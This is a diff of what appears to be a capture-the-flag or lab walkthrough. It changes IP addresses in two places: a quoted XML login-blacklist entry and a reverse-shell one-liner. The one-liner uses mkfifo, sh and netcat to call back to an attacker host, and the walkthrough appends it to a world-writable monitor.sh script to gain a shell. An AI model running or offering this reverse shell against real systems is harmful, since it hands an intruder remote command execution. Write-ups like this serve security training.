@@ -153,7 +153,7 @@ Here, we can found our valid admin user name:
     <session_fail_count type="integer">0</session_fail_count>
     <session_date type="integer">1514544131</session_date>
   </user>
-  <blacklist type="string" ip="10.10.10.1">
+  <blacklist type="string" ip="10.0.10.1">
     <date type="integer">1512964659</date>
     <fail_count type="integer">1</fail_count>
   </blacklist>
@@ -279,7 +279,7 @@ As `monitor.sh` is world-writable, we can append a reverse shell one-liner to th
 We will append a bash one-liner at the end of `monitor.sh`:
 
 ```
-$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 1235 >/tmp/f' | tee -a monitor.sh
+$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1235 >/tmp/f' | tee -a monitor.sh
 ```
 
 We open a new necat listener on our host (attacker):
